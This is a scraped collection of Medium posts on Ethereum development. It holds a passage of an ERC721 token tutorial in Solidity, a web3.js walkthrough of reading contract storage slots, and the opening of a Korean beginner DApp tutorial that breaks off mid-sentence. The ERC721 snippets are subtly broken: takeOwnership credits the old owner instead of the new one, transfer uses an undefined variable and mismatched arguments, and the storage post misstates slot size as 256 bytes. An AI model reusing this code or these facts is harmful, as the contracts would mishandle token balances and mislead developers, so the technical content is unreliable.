implementation of the function can be as follows.contract MyNFT {  function name() constant returns (string name){    return \"My Non-Fungible Token\";  }}symbolThis function also helps in providing compatibility with the ERC20 token standard. It provides outside programs with the token\u2019s shorthand name, or symbol.contract MyNFT {  function symbol() constant returns (string symbol){    return \"MNFT\";}}totalSupplyThis function returns the total number of coins available on the blockchain. The supply does not have to be constant.contract MyNFT {  // This can be an arbitrary numberuint256 private totalSupply = 1000000000;function totalSupply() constant returns (uint256 supply){    return totalSupply;}}balanceOfThis function is used to find the number of tokens that a given address owns.contract MyNFT {  mapping(address => uint) private balances;function balanceOf(address _owner) constant returns (uint balance)  {    return balances[_owner];}}Ownership FunctionsThese functions define how the contract will handle token ownership and how ownership can be transferred. The most notable of these functions aretakeOwnership and transfer , which act like withdraw and send functions, respectively, and are essential for letting users transfer tokens between each other.ownerOfThis function returns the address of the owner of a token. Because each ERC721 token is non-fungible and, therefore, unique, it\u2019s referenced on the blockchain via a unique ID. We can determine the owner of a token using its ID.contract MyNFT {  mapping(uint256 => address) private tokenOwners;  mapping(uint256 => bool) private tokenExists;function ownerOf(uint256 _tokenId)  constant returns (address owner) {    require(tokenExists[_tokenId]);return tokenOwners[_tokenId];}}approveThis function approves, or grants, another entity permission to transfer a token on the owner\u2019s behalf. For example, if Alice owns 1 MyNFT she can call the approve function for her friend Bob. After a successful call, Bob could take ownership of or perform operations on the token at a later time on Alice\u2019s behalf. More information on transferring ownership can be seen in the takeOwnership and transfer functions.contract MyNFT {  mapping(address => mapping (address => uint256)) allowed;function approve(address _to, uint256 _tokenId){    require(msg.sender == ownerOf(_tokenId));    require(msg.sender != _to);allowed[msg.sender][_to] = _tokenId;    Approval(msg.sender, _to, _tokenId);}}takeOwnershipThis function acts like a withdraw function, since an outside party can call it in order to take tokens out of another user\u2019s account. Therefore, takeOwnershipcan be used to when a user has been approved to own a certain amount of tokens and wishes to withdraw said tokens from another user\u2019s balance.contract MyNFT {  function takeOwnership(uint256 _tokenId){    require(tokenExists[_tokenId]);address oldOwner = ownerOf(_tokenId);    address newOwner = msg.sender;require(newOwner != oldOwner);require(allowed[oldOwner][newOwner] == _tokenId);    balances[oldOwner] -= 1;    tokenOwners[_tokenId] = newOwner;balances[oldOwner] += 1;    Transfer(oldOwner, newOwner, _tokenId);}}transferThe next method of transferring tokens is using this function. transfer lets the owner of a token send it to another user, similar to a standalone cryptocurrency. However, a transfer can only be initiated if the receiving account has previously been approved to own the token by the sending account.contract MyNFT {  mapping(address => mapping(uint256 => uint256)) private ownerTokens;  function removeFromTokenList(address owner, uint256 _tokenId) private {    for(uint256 i = 0;ownerTokens[owner][i] != _tokenId;i++){      ownerTokens[owner][i] = 0;    }}function transfer(address _to, uint256 _tokenId){    address currentOwner = msg.sender;    address newOwner = _to;require(tokenExists[_tokenId]);require(currentOwner == ownerOf(_tokenId));    require(currentOwner != newOwner);    require(newOwner != address(0));    removeFromTokenList(_tokenId);balances[oldOwner] -= 1;    tokenOwners[_tokenId] = newOwner;balances[newOwner] += 1;    Transfer(oldOwner, newOwner, _tokenId);}}tokenOfOwnerByIndex (Optional \u2014 Recommended)Each non-fungible token owner can own more than one token at one time. Because each token is referenced by its unique ID, however, it can get difficult to keep track of the individual tokens that a user may own. To do this, the contract keeps a record of the IDs of each token that each user owns. Because of this, each individual token owned by a user can be retrieved by its index in the list (array) of tokens owned by the user. tokenOfOwnerByIndex lets us retrieve a token in this method.contract MyNFT {  mapping(address => mapping(uint256 => uint256)) private ownerTokens;function tokenOfOwnerByIndex(address _owner, uint256 _index) constant returns (uint tokenId){return ownerTokens[_owner][_index];}}Metadata FunctionLike we\u2019ve said before, what makes non-fungible items non-fungible is their unique set of attributes. A dollar and a baseball card are not fungible, because they have different characteristics. But, storing data on the blockchain that tell the defining characteristics of each token is extremely expensive and not recommended. To combat this, we can store references, like an IPFS hash or HTTP(S) link, to each token\u2019s attributes on the chain so that a program outside of the chain can execute logic to find more information about the token. These references are data about data, or metadata.tokenMetadata (Optional \u2014 Recommended)This function lets us discover a token\u2019s metadata, or the link to the its data.contract MyNFT {  mapping(uint256 => string) tokenLinks;function tokenMetadata(uint256 _tokenId) constant returns (string infoUrl) {    return tokenLinks[_tokenId];}}EventsEvents are fired whenever a contract calls them, and they\u2019re broadcasted to any listening programs once they\u2019ve been fired. Outside programs listen to blockchain events so that they can execute logic once the event is fired using the information that the event provides. The ERC721 standard defines two events that are as follow.TransferThis event is fired whenever a token changes hands. It\u2019s broadcasted when a token\u2019s ownership moves from one user to another. It details which account sent the token, which account received the token, and which token (by ID) was transferred.contract MyNFT {  event Transfer(address indexed _from, address indexed _to, uint256 _tokenId);}ApprovalThis event is fired whenever a user approves another user to take ownership of a token (i.e. whenever approve is executed). It details which account currently owns the token, which account is allowed to own the token in the future, and which token (by ID) is approved to have its ownership transferred.contract MyNFT {  event Approval(address indexed _owner, address indexed _approved, uint256 _tokenId);}The source code of my implementation of the ERC721 standard can be found here.Similar to ERC20, the newly proposed ERC721 standard has opened up a gateway for new smart contracts to act as non-fungible items. As can be seen in applications like CryptoKitties, Decentraland, CryptoPunks, and many others, non-fungible tokens have proven to be very high demand products. Even WikiLeaks owns several high value CryptoKitties! But, ultimately this standard will further expand the cryptocurrency economy and help advance the field even more.At the time of this writing, ERC721 is not an official standard and is still undergoing revisions.", "responses": 2, "tags": ["Blockchain", "Ethereum", "Solidity", "Erc721", "Programming"]}, {"title": "How to read Ethereum contract storage", "post_link": "https://medium.com/aigang-network/how-to-read-ethereum-contract-storage-44252c8af925?source=search_post", "author_name": "Darius", "author_link": "https://medium.com/@dariusdev", "publish_date": "2017-09-14", "last_modified_date": "2018-06-16", "readtime": "2.43", "claps": 924, "voters": 135, "content": "How to read Ethereum contract storageDariusFollowSep 14, 2017 \u00b7 3 min readEverybody is talking that data in contracts are public, but not everybody knows how to read it.All contracts deployed to ethereum VM has dedicated storage where stores state. Here is an example how to read this storage with the web3.js library using eth.getStorageAt() method.Contract example which we examine:This contract is deployed in ropsten test net: at 0xf1f5896ace3a78c347eb7eab503450bc93bd0c3bAll parameters in the storage are indexed from the beginning. One index takes 256 bytes ant it fits 64 symbols. In this example, we have 10 parameters and we can iterate them:let contractAddress = '0xf1f5896ace3a78c347eb7eab503450bc93bd0c3b'for (index = 0; index < 10; index++){ console.log(`[${index}]` +    web3.eth.getStorageAt(contractAddress, index))}result:[0] 0x000000000000000000000000000000000000000000000000000000000000000f[1] 0x00000000000000000000000059b92d9a0000000000000000000000000000429f[2] 0x0000000000000000000000000000000074657374310000000000000000000000[3] 0x7465737431323336000000000000000000000000000000000000000000000000[4] 0x6c65747320737472696e6720736f6d657468696e67000000000000000000002a[5] 0x0000000000000000000000000000000000000000000000000000000000000000[6] 0x0000000000000000000000000000000000000000000000000000000000000000[7] 0x0000000000000000000000000000000000000000000000000000000000000002[8] 0x0000000000000000000000000000000000000000000000000000000000000002[9] 0x0000000000000000000000000000000000000000000000000000000000000000Let`s have a deeper look into each parameterIndex 0 \u2014 storeduint1let contractAddress = '0xf1f5896ace3a78c347eb7eab503450bc93bd0c3b'let index = 0console.log(web3.eth.getStorageAt(contractAddress, index))console.log('DEC:' + web3.toDecimal(web3.eth.getStorageAt(contractAddress, index)))result:0x000000000000000000000000000000000000000000000000000000000000000fDEC:15constuintConstants are not stored in a storage. Available only in code.Index 1 \u2014 investmentsLimit, investmentsDeadlineTimeStamplet index = 1console.log(web3.eth.getStorageAt(contractAddress, index))result: 0x00000000000000000000000059b92d9a0000000000000000000000000000429fDEC:  1505308058   and  17055In index 1 is merged 2 properties to optimize storage usage.index 2 \u2014 string1index = 2console.log(web3.eth.getStorageAt(contractAddress, index))console.log('ASCII: ' + web3.toAscii(web3.eth.getStorageAt(contractAddress, index)))result: 0x0000000000000000000000000000000074657374310000000000000000000000ASCII: test1index 3 \u2014 string2index = 3console.log(web3.eth.getStorageAt(contractAddress, index))console.log('ASCII: ' + web3.toAscii(web3.eth.getStorageAt(contractAddress, index)))result:0x7465737431323336000000000000000000000000000000000000000000000000ASCII: test1236index 4\u2014 string3index = 4console.log(web3.eth.getStorageAt(contractAddress, index))console.log('ASCII: ' + web3.toAscii(web3.eth.getStorageAt(contractAddress, index)))result:0x6c65747320737472696e6720736f6d657468696e67000000000000000000002aASCII: lets string something         * (42)End symbol 2a (dec 42) is length of the stored string. (more details http://solidity.readthedocs.io/en/latest/miscellaneous.html#layout-of-state-variables-in-storage)index 5 \u2014 uints1index = 5console.log(web3.eth.getStorageAt(contractAddress, index))result:0x0000000000000000000000000000000000000000000000000000000000000000PROBLEM!!!!Mappings have a different indexation and should be read in other way. To read mapping value you should know the key value. Otherwise, read mapping value is impossible.index = '0000000000000000000000000000000000000000000000000000000000000005'key =  '00000000000000000000000xbccc714d56bc0da0fd33d96d2a87b680dd6d0df6'let newKey =  web3.sha3(key + index, {\"encoding\":\"hex\"})console.log(web3.eth.getStorageAt(contractAddress, newKey))console.log('DEC: ' + web3.toDecimal(web3.eth.getStorageAt(contractAddress, newKey)))result:0x0000000000000000000000000000000000000000000000000000000000000058DEC: 88index6 \u2014 structs1index = \"0000000000000000000000000000000000000000000000000000000000000006\"key =  \"00000000000000000000000xbccc714d56bc0da0fd33d96d2a87b680dd6d0df6\"let newKey =  web3.sha3(key + index, {\"encoding\":\"hex\"})console.log(web3.eth.getStorageAt(contractAddress, newKey))console.log('ASCII: ' + web3.toAscii(web3.eth.getStorageAt(contractAddress, newKey)))result:0x6465766963654272616e64000000000000000000000000000000000000000016ASCII: deviceBrandTo read second struct value you need to increase newKey value by 1function increaseHexByOne(hex) { let x = new BigNumber(hex) let sum = x.add(1) let result = '0x' + sum.toString(16) return result}index = \"0000000000000000000000000000000000000000000000000000000000000006\"key =  \"00000000000000000000000xbccc714d56bc0da0fd33d96d2a87b680dd6d0df6\"let newKey =  increaseHexByOne(  web3.sha3(key + index, {\"encoding\":\"hex\"}))console.log(web3.eth.getStorageAt(contractAddress,newKey))console.log('ASCII: ' + web3.toAscii(web3.eth.getStorageAt(contractAddress, newKey)))result:0x6465766963655965617200000000000000000000000000000000000000000014ASCII: deviceYearIf you want third struct value increase newKey once more.index 7\u2014 uintarrayindex = \"7\"console.log(web3.eth.getStorageAt(contractAddress, index))result:  0x0000000000000000000000000000000000000000000000000000000000000002This array has 2 itemsindex = \"0000000000000000000000000000000000000000000000000000000000000007\"let newKey = web3.sha3(index, {\"encoding\":\"hex\"})console.log(web3.eth.getStorageAt(contractAddress, newKey))console.log('DEC: ' +  web3.toDecimal(web3.eth.getStorageAt(contractAddress, newKey)))result:0x0000000000000000000000000000000000000000000000000000000000001f40DEC: 8000newKey = increaseHexByOne(web3.sha3(index, {\"encoding\":\"hex\"}))console.log(web3.eth.getStorageAt(contractAddress, newKey))console.log('DEC: ' +  web3.toDecimal(web3.eth.getStorageAt(contractAddress, newKey)))result:0x0000000000000000000000000000000000000000000000000000000000002328DEC: 9000index 8\u2014 deviceDataArrayindex = \"0000000000000000000000000000000000000000000000000000000000000008\"let newKey = web3.sha3(index, {\"encoding\":\"hex\"})console.log(web3.eth.getStorageAt(contractAddress, newKey))console.log('ASCII: ' + web3.toAscii(web3.eth.getStorageAt(contractAddress, newKey)))result:0x6465766963654272616e64000000000000000000000000000000000000000016ASCII: deviceBrandindex = \"0000000000000000000000000000000000000000000000000000000000000008\"let newKey = increaseHexByOne(web3.sha3(index, {\"encoding\":\"hex\"}))console.log(web3.eth.getStorageAt(contractAddress, newKey))console.log('ASCII: ' +web3.toAscii(web3.eth.getStorageAt(contractAddress, newKey)))result:0x6465766963655965617200000000000000000000000000000000000000000014ASCII: deviceYearIncrease by 2 result:0x776561724c6576656c0000000000000000000000000000000000000000000012ASCII: wearLevelIncrease by 3 you enter to second item into array result:0x6465766963654272616e64320000000000000000000000000000000000000018ASCII: deviceBrand2Sources:https://github.com/ethereum/solidity/issues/1550https://github.com/ethereum/wiki/wiki/JSON-RPC#eth_getstorageathttps://ethereum.stackexchange.com/questions/13910/how-to-read-a-private-variable-from-a-contracthttps://github.com/ethereum/web3.js/issues/445Check out our testing ground \u2014 Aigang!More about Aigang \u2014 http://bit.ly/AigangWebsiteAigang Whitepaper \u2014 http://bit.ly/2hwAtktAigang on Telegram \u2014 http://bit.ly/AigangTelegramGet Aigang Latest Updates \u2014 http://bit.ly/AigangUpdates", "responses": 11, "tags": ["Ethereum", "Blockchain", "Smart Contracts", "Solidity", "Coding"]}, {"title": "\ucd08\ubcf4\uc790\ub4e4\uc744 \uc704\ud55c \uc774\ub354\ub9ac\uc6c0 DApp \ub9cc\ub4e4\uae30", "post_link": "https://medium.com/@weekly.teckle/%EC%B4%88%EB%B3%B4%EC%9E%90%EB%93%A4%EC%9D%84-%EC%9C%84%ED%95%9C-%EC%9D%B4%EB%8D%94%EB%A6%AC%EC%9B%80-dapp-%EB%A7%8C%EB%93%A4%EA%B8%B0-c6ddb0c6651d?source=search_post", "author_name": "Teckle", "author_link": "https://medium.com/@weekly.teckle", "publish_date": "2018-04-30", "last_modified_date": "2018-06-21", "readtime": "14.3", "claps": 617, "voters": 137, "content": "\ucd08\ubcf4\uc790\ub4e4\uc744 \uc704\ud55c \uc774\ub354\ub9ac\uc6c0 DApp \ub9cc\ub4e4\uae30TeckleFollowApr 30, 2018 \u00b7 15 min readAbout Teckle (Technology + Tackle = Teckle)Teckle\uc740 \u201c\uc5b4\ub824\uc6b4 \uae30\uc220\uc744 \ud655\uace0\ud788, \ud6a8\uc728\uc801\uc73c\ub85c \ubd84\uc11d\ud558\uc5ec, \ub9ce\uc740 \uc774\ub4e4\uc774 \uc54c \uc218 \uc788\ub3c4\ub85d \ub110\ub9ac \uc54c\ub9ac\uc790\u201d \ub77c\ub294 \ubaa9\uc801\uc744 \uac00\uc9c0\uace0 \ub9cc\ub4e4\uc5b4\uc9c4 \ube14\ub85d\uccb4\uc778 \uc2a4\ud130\ub514 \ubc0f DApp \uac1c\ubc1c \ubaa8\uc784\uc785\ub2c8\ub2e4. \ud604\uc7ac 6\uc778\uc758 \uba64\ubc84\uac00 \ud568\uaed8\ud558\uace0 \uc788\uc2b5\ub2c8\ub2e4.\ub4e4\uc5b4\uac00\uba70\uc774 \uae00\uc740 DApp\uc744 \ucc98\uc74c \uc811\ud558\ub294 \uac1c\ubc1c\uc790\ub97c \uc704\ud55c \uae00\uc785\ub2c8\ub2e4. Solidity \uc5b8\uc5b4\ub85c \uc774\ub354\ub9ac\uc6c0 \uae30\ubc18\uc758 \ud0c8\uc911\uc559\ud654\ub41c \uc560\ud50c\ub9ac\ucf00\uc774\uc158(Decetralized applications)\uc744 \ub9cc\ub4dc\ub294 \uacfc\uc815\uc744 \uc774\ud574\ud560 \uc218 \uc788\uac8c \uc37c\uc2b5\ub2c8\ub2e4.*\uae30\ucd08\uc801\uc778 \uc6f9 \uac1c\ubc1c \uc9c0\uc2dd\uc744 \ud544\uc694\ub85c \ud569\ub2c8\ub2e4.\ubaa9\ucc28:Part 1. \uac1c\ubc1c \ud750\ub984 \uc774\ud574\ud558\uae30DApp\uc774 \ubb54\uac00\uc694?Solidity\ub780?\uac1c\ubc1c \ud658\uacbd \uad6c\uc131Part 2. \uac1c\ubc1c\ubd80\ud130 \ubc30\ud3ec\uae4c\uc9c0\uc2a4\ub9c8\ud2b8 \ucee8\ud2b8\ub799\ud2b8 \uc791\uc131\ud14c\uc2a4\ud2b8\ub137 \ubc30\ud3ec\ud504\ub860\ud2b8\uc5d4\ub4dc \uc791\uc131\uba54\uc778\ub137 \ubc30\ud3ecPart1. \uac1c\ubc1c \ud750\ub984 \uc774\ud574\ud558\uae30A. DApp\uc774 \ubb54\uac00\uc694?\uba3c\uc800 DApp(Decentralized application)\uc5d0 \ub300\ud55c \uc774\ud574\ub97c \ud558\uace0 \ub118\uc5b4\uac00\uc57c\uaca0\uc8e0? DApp\uc740 \ube14\ub85d\uccb4\uc778 \uc704\uc5d0\uc11c \ub3cc\uc544\uac00\ub294 \uc560\ud50c\ub9ac\ucf00\uc774\uc158\uc785\ub2c8\ub2e4. \uc544\uc774\ud3f0\uacfc \uad6c\uae00\uc774 \uac01\uac01\uc758 OS\ub85c \ud50c\ub7ab\ud3fc\uc744 \ub9cc\ub4e4\uace0 \uadf8 \uc704\uc5d0 \uc571\ub4e4\uc744 \ub9cc\ub4e4 \uc218 \uc788\ub294 \uc0dd\ud0dc\uacc4\ub97c \uc81c\uacf5\ud55c \uac83\ucc98\ub7fc, \ube14\ub85d\uccb4\uc778 \ud50c\ub7ab\ud3fc (ex. \uc774\ub354\ub9ac\uc6c0, \uc774\uc624\uc2a4, \ud000\ud140, \ub124\uc624 \ub4f1) \uc5ed\uc2dc \uadf8 \uc704\uc5d0 \uc560\ud50c\ub9ac\ucf00\uc774\uc158\uc744 \ub9cc\ub4e4\uace0 \uc6b4\uc601\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4.\uadf8\ub807\ub2e4\uba74 \uc77c\ubc18 \uc560\ud50c\ub9ac\ucf00\uc774\uc158\uacfc DApp\uc758 \ucc28\uc774\uac00 \ubb50\uc57c? \ub77c\ub294 \uc758\ubb38\uc774 \ub4dc\uc2e4\ud150\ub370\uc694. \uc644\ubcbd\ud788 \ud0c8\uc911\uc559\ud654\ub41c \uc560\ud50c\ub9ac\ucf00\uc774\uc158\uc740 \ub2e4\uc74c\uacfc \uac19\uc740 \ud2b9\uc131\uc744 \uac00\uc9c0\uace0 \uc788\uc2b5\ub2c8\ub2e4:\uc624\ud508 \uc18c\uc2a4 \uae30\ubc18\uc774\uba70 \uc790\uc728\uc801\uc73c\ub85c \uc6b4\uc601\ub428 (\ube14\ub85d\uccb4\uc778\uc73c\ub85c \uc6b4\uc601\ud558\ub294 \uc11c\ube44\uc2a4\ub294 \uc11c\ube44\uc2a4\uac00 \uc911\ub2e8\ub418\uac70\ub098 \uc0ac\ub77c\uc9c4\ub2e4\uace0 \ud558\ub354\ub77c\ub3c4, \ud55c \ubc88 \ubc30\ud3ec\ud558\uba74 \uc601\uc6d0\ud558\uae30 \ub54c\ubb38\uc5d0 \uacc4\uc18d\ud574\uc11c \uc0ac\uc6a9\uc774 \uac00\ub2a5)\ud37c\ube14\ub9ad \ube14\ub85d\uccb4\uc778 \uc704\uc5d0 \ub370\uc774\ud130\ub97c \uc800\uc7a5 (\ud55c\ubc88 \ube14\ub85d\uccb4\uc778 \uc704\uc5d0 \uc62c\ub77c\uac00\uba74 \ub370\uc774\ud130\ub97c \ub2e4\uc2dc \ub418\ub3cc\ub9ac\uac70\ub098 \ubcc0\ud615 \ubd88\uac00\ub2a5)\uc554\ud638\ud654\ud3d0\uc5d0 \uac00\uce58\ub97c \ubd80\uc5ec\ud568\uc54c\uace0\ub9ac\uc998 \uae30\ubc18\uc5d0 \uc758\ud55c \ud1a0\ud070 \uc0dd\uc131\uc704\uc640 \uac19\uc740 \ud2b9\uc9d5\ub54c\ubb38\uc5d0 \ub370\uc774\ud130 \uc870\uc791\uc73c\ub85c \ubd80\ud130 \uc548\uc804\ud558\uba70, \ubbfc\uc8fc\uc801\uc73c\ub85c \uc560\ud50c\ub9ac\ucf00\uc774\uc158\uc744 \uc6b4\uc601\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. (\ucee4\ubba4\ub2c8\ud2f0\uac00 \uc8fc\ub3c4\ud574\uc11c \uc5c5\ub370\uc774\ud2b8\ub97c \ubc18\uc601\ud560\uc9c0, \ubc18\uc601\ud558\uc9c0 \uc54a\uc744\uc9c0 \uc815\ud558\uae30 \ub54c\ubb38\uc5d0, \uac1c\ubc1c\uc790\ub4e4\uc774 \ub9c8\uc74c\ub300\ub85c \uc11c\ube44\uc2a4\ub97c \ubc14\uafc0 \uc218 \uc5c6\uc2b5\ub2c8\ub2e4).DApp \uc758 \uac00\uc7a5 \uc720\uba85\ud55c \uc608\uc2dc\ub85c\ub294 \ud06c\ub9bd\ud1a0\ud0a4\ud2f0(Cryptokitties)\uac00 \uc788\uc2b5\ub2c8\ub2e4. \ud06c\ub9bd\ud1a0\ud0a4\ud2f0\ub294 DApp\uc73c\ub85c \uad6c\ud604\ub41c \ucd5c\ucd08\uc758 \uac8c\uc784\uc785\ub2c8\ub2e4. \uace0\uc591\uc774\ub97c \uc218\uc9d1, \uad50\ubc30\ud558\ub294\ub370, \uace0\uc591\uc774\ub294 \uac00\uc0c1 \ud654\ud3d0\ub85c \uac70\ub798\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. \ud55c\ub54c \uc774\ub354\ub9ac\uc6c0 \uba54\uc778\ub137\uc744 \ub9c8\ube44\uc2dc\ud0ac \uc815\ub3c4\ub85c \uc778\uae30\ub97c \ub04c\uc5c8\ub358 \uc571\uc774\uae30\ub3c4 \ud558\uba70, \uc5bc\ub9c8\uc804\uc5d4 \ud070 \ud22c\uc790 \uc720\uce58\uae4c\uc9c0 \uc644\ub8cc\ud588\uc2b5\ub2c8\ub2e4. \uac8c\uc784\uc5d0\uc11c \uc0ac\uc6a9\ub418\ub294 \uac70\ub798\uc640 \ub370\uc774\ud130 \uc911 \ud06c\ub9bd\ud1a0 \uc774\ubbf8\uc9c0\uc640 \uac19\uc740 \uc77c\ubc18\uc801\uc778 \ub9ac\uc18c\uc2a4\ub4e4\uc740 \uc911\uc559\ud654\ub41c \uc11c\ubc84\uc5d0\uc11c \uad00\ub9ac\ub97c \ud558\ub098, ERC 721 \ud1a0\ud070 \uc18c\uc720\uad8c\uc5d0 \ub300\ud574\uc11c\ub294 \ube14\ub85d\uccb4\uc778 \uc704\uc5d0 \ub370\uc774\ud130\ub97c \uc62c\ub9ac\ub294 \ud615\uc2dd\uc73c\ub85c \uc6b4\uc601\ud558\uace0 \uc788\uc2b5\ub2c8\ub2e4.CryptoKittiesDelegateCall\ud06c\ub9bd\ud1a0\ud0a4\ud2f0\ub97c \ud3ec\ud568\ud55c \ub300\ubd80\ubd84\uc758 DApp \ub4e4\uc774 \uc77c\ubd80 \ub9ac\uc18c\uc2a4\ub97c \uc911\uc559\ud654\ub41c \uc11c\ubc84\uc5d0 \uc800\uc7a5\ud558\ub294 \uac83\uacfc \ub2ec\ub9ac, DelegateCall(\ube14\ub85d\uccb4\uc778 \uae30\ubc18 Q&A \uc9c8\ubb38 DApp)\ucc98\ub7fc 100% \ube14\ub85d\uccb4\uc778 \uc704\uc5d0\uc11c \ub3cc\uc544\uac00\ub294 \uc11c\ube44\uc2a4\ub3c4 \uc788\uc2b5\ub2c8\ub2e4.\ud604\uc7ac \uc774\ub354\ub9ac\uc6c0 \ube14\ub85d\uccb4\uc778\uc5d0\uc11c \uc6b4\uc601\ub418\uace0 \uc788\ub294 \ub2e4\uc591\ud55c DApp\uc744 \ubcf4\uace0 \uc2f6\uc73c\uc2dc\ub2e4\uba74, \uc774\uacf3\uc5d0\uc11c \ud655\uc778 \uac00\ub2a5\ud569\ub2c8\ub2e4.B. Solidity\ub780?Solidity\ub780 \uc774\ub354\ub9ac\uc6c0 \uae30\ubc18\uc758 \uc2a4\ub9c8\ud2b8 \ucee8\ud2b8\ub799\ud2b8\ub97c \uc791\uc131\ud560 \uc218 \uc788\ub294 \uac1d\uccb4\uc9c0\ud5a5\ud615 \ud504\ub85c\uadf8\ub798\ubc0d \uc5b8\uc5b4\uc785\ub2c8\ub2e4. C++, Python, \uadf8\ub9ac\uace0 \uc790\ubc14\uc2a4\ud06c\ub9bd\ud2b8\uc5d0 \uc601\ud5a5\uc744 \ub9ce\uc774 \ubc1b\uc558\uc73c\uba70, \uc9dc\uc5ec\uc9c4 \uc2a4\ub9c8\ud2b8 \ucee8\ud2b8\ub799\ud2b8\ub294 \uc774\ub354\ub9ac\uc6c0 \uac00\uc0c1 \uba38\uc2e0\uc778 EVM(Ethereum Virtual Machine)\uc5d0\uc11c \uc2e4\ud589\ub429\ub2c8\ub2e4.Solidity is statically typed, supports inheritance, libraries and complex user-defined types among other features.\uc704 \ubb38\uc7a5\uc5d0 \ub098\uc640\uc788\ub4ef\uc774 \uc194\ub9ac\ub514\ud2f0\ub294 \uc815\uc801 \ud0c0\uc785\uc758 \uc5b8\uc5b4\uc774\uba70, \uc0c1\uc18d\uacfc \ub77c\uc774\ube0c\ub7ec\ub9ac, \uc0ac\uc6a9\uc790 \uc815\uc758 \ud0c0\uc785\uc744 \uc9c0\uc6d0\ud558\ub294 \ub4f1 \uc5ec\ub7ec \ud2b9\uc9d5\uc774 \uc788\uc2b5\ub2c8\ub2e4.\ubb3c\ub860 \uc194\ub9ac\ub514\ud2f0 \uc774\uc678\uc5d0\ub3c4 \uc774\ub354\ub9ac\uc6c0 \uae30\ubc18\uc758 DApp\uc744 \ub9cc\ub4e4 \uc218 \uc788\ub294 \uc5b8\uc5b4\ub4e4\uc774 \uc788\uc2b5\ub2c8\ub2e4. \ud558\uc9c0\ub9cc \uc194\ub9ac\ub514\ud2f0\uac00 \uac00\uc7a5 \ub110\ub9ac \uc4f0\uc774\uace0 \uc788\uc2b5\ub2c8\ub2e4. \uac00\uc7a5 \ub9ce\uc774 \uc4f0\uc5ec\uc9c0\ub294 \uc5b8\uc5b4\uc774\ub2e4 \ubcf4\ub2c8 \uc9c0\uc6d0\ub3c4 \ub9ce\uc774 \ub418\uace0, \ubb38\uc11c\ud654\uac00 \uc798 \ub418\uc5b4 \uc788\uc2b5\ub2c8\ub2e4.\uc194\ub9ac\ub514\ud2f0\ub97c \uc0ac\uc6a9\ud558\uba74, \ud22c\ud45c\ub97c \uc704\ud55c DApp\ubd80\ud130, \ud06c\ub77c\uc6b0\ub4dc \ud380\ub529 \uc11c\ube44\uc2a4, \uacbd\ub9e4 \uc2dc\uc2a4\ud15c, \ub2e4\uc911 \uc9c0\uac11 \ub4f1\uc758 \uc11c\ube44\uc2a4\ub4e4\uc744 \uad6c\ud604\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. \uc544\uc9c1 \uc194\ub9ac\ub514\ud2f0\ub97c \uc811\ud558\uc9c0 \uc54a\uc740 \ubd84\uc774\uc2dc\ub77c\uba74, CryptoZombies\ub77c\ub294 \uac8c\uc784\uc744 \ucd94\ucc9c\ud569\ub2c8\ub2e4. \uac8c\uc784\uc744 \ub9cc\ub4e4\uba74\uc11c \uc2a4\ub9c8\ud2b8 \ucee8\ud2b8\ub799\ud2b8\uc5d0 \ub300\ud55c \uac1c\ub150\uacfc \uc791\uc131 \ubc29\ubc95\uc744 \uc27d\uac8c \ubc30\uc6b8 \uc218 \uc788\uc2b5\ub2c8\ub2e4.C. \uac1c\ubc1c \ud658\uacbd \uad6c\uc131\ud558\uae30DApp\uc744 \uad6c\ud604\ud558\uae30 \uc704\ud55c \uac1c\ubc1c \ud658\uacbd\uc740 \ud06c\uac8c \ub450 \uac00\uc9c0\ub85c \ub098\ub20c \uc788\uc2b5\ub2c8\ub2e4. \uc2a4\ub9c8\ud2b8 \ucee8\ud2b8\ub799\ud2b8\ub97c \uc791\uc131\ud558\uace0 \ubc30\ud3ec\ud558\ub294 \ubc31\uc5d4\ub4dc \uc0ac\uc774\ub4dc\uc640, \uc0ac\uc6a9\uc790 \uc778\ud130\ud398\uc774\uc2a4\ub97c \uad6c\ud604\ud560 \ud504\ub860\ud2b8\uc5d4\ud2b8 \uc0ac\uc774\ub4dc\uc785\ub2c8\ub2e4. \uc544\ub798 \uadf8\ub9bc\uc740 \uc804\uccb4 \uac1c\ubc1c \ud658\uacbd\uc744 \ud45c\ud604\ud55c \ub2e4\uc774\uc5b4\uadf8\ub7a8\uc785\ub2c8\ub2e4. \uc774 \ub2e4\uc774\uc5b4\uadf8\ub7a8\uc5d0 \ub300\ud55c \uc790\uc138\ud55c \uc124\uba85\uc740 \ubc11\uc5d0\uc11c \uc774\uc5b4\uac00\ub3c4\ub85d \ud558\uaca0\uc2b5\ub2c8\ub2e4.Front-end:HTML/CSS/Javascript\uc6f9 \ud504\ub860\ud2b8\uc5d4\ub4dc\ub97c \uc791\uc131\uc5d0 \uc0ac\uc6a9\ud558\ub294 \uc5b8\uc5b4\ub4e4. \ube14\ub85d\uccb4\uc778 \uae30\ubc18 \uc11c\ube44\uc2a4(DApp)\uc758 \ud074\ub77c\uc774\uc5b8\ud2b8\ub97c \uc6f9 \ube0c\ub77c\uc6b0\uc800 \uae30\ubc18\uc73c\ub85c \ub9cc\ub4e4 \ub54c \ud544\uc694.Web3.js\uc774\ub354\ub9ac\uc6c0 \uc790\ubc14\uc2a4\ud06c\ub9bd\ud2b8 API.Metamask\uc774\ub354\ub9ac\uc6c0 \ud480\ub178\ub4dc\ub97c \uc6b4\uc601\ud558\uc9c0 \uc54a\uace0\ub3c4 \uc6f9 \ube0c\ub77c\uc6b0\uc800\uc5d0\uc11c DApp\uc744 \uc0ac\uc6a9\ud560 \uc218 \uc788\uac8c \ud574\uc8fc\ub294 \ud06c\ub86c \ubc0f \ud30c\uc774\uc5b4\ud3ed\uc2a4 \ud655\uc7a5 \ud504\ub85c\uadf8\ub7a8. \uc989, \uc77c\ubd80 \ud544\uc218\uc801\uc778 \ube14\ub85d \ud5e4\ub354 \ub370\uc774\ud130\ub9cc \uc678\ubd80\uc758 \ud480\ub178\ub4dc\ub85c\ubd80\ud130 \ubc1b\uc544\uc640 \uac80\uc99d\ud558\ub294 \ub77c\uc774\ud2b8 \ud074\ub77c\uc774\uc5b8\ud2b8 \uc911 \ud558\ub098.\uba54\ud0c0\ub9c8\uc2a4\ud06c\ub97c \uc0ac\uc6a9\ud558\uba74 \uc5ec\ub7ec \uc0ac\uc774\ud2b8\uc758 \uacc4\uc815\uc744 \uad00\ub9ac\ud558\uace0, \ube14\ub85d\uccb4\uc778 \ud2b8\ub79c\uc7ad\uc158\uc5d0 \uc11c\uba85\ud560 